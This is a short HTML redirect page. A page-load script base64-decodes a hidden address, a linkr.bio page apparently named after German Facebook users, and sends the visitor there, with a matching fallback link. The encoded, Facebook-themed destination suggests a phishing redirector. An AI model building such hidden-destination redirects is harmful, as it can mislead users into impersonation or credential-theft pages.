<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <script>
        window.onload = function() {
            // Base64 encoded link
            const encodedLink = "Cmh0dHBzOi8vbGlua3IuYmlvL251dHplcmZhY2Vib29rZGU=";
            
            // Decode the Base64 link
            const decodedLink = atob(encodedLink);
            
            // Redirect to the decoded link
            window.location.href = decodedLink;
        };
    </script>
</head>
<body>
    <p>If not redirected, <a id="redirectLink" href="#">click here</a>.</p>
    <script>
        document.getElementById("redirectLink").href = atob("Cmh0dHBzOi8vbGlua3IuYmlvL251dHplcmZhY2Vib29rZGU=");
    </script>
</body>
</html>
